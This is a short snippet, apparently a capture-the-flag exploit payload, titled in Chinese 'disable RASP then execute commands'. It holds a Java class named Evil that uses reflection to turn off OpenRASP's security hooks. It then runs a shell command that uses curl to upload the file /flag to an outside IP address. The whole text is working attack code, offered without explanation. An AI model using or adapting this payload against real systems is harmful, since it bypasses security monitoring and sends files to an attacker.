# 关闭RASP然后命令执行

```java
import java.io.BufferedReader;
import java.io.FileReader;
import java.net.HttpURLConnection;
import java.net.URL;
public class Evil {
    public Evil() throws Exception{

            Class<?> clz = Thread.currentThread().getContextClassLoader().loadClass("com.baidu.openrasp.config.Config");
            java.lang.reflect.Method getConfig = clz.getDeclaredMethod("getConfig");
            java.lang.reflect.Field disableHooks = clz.getDeclaredField("disableHooks");
            disableHooks.setAccessible(true);
            Object ins = getConfig.invoke(null);

            disableHooks.set(ins,true);
            Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","curl http://121.5.169.223:39454 -F file=@/flag"});

    }
}

```

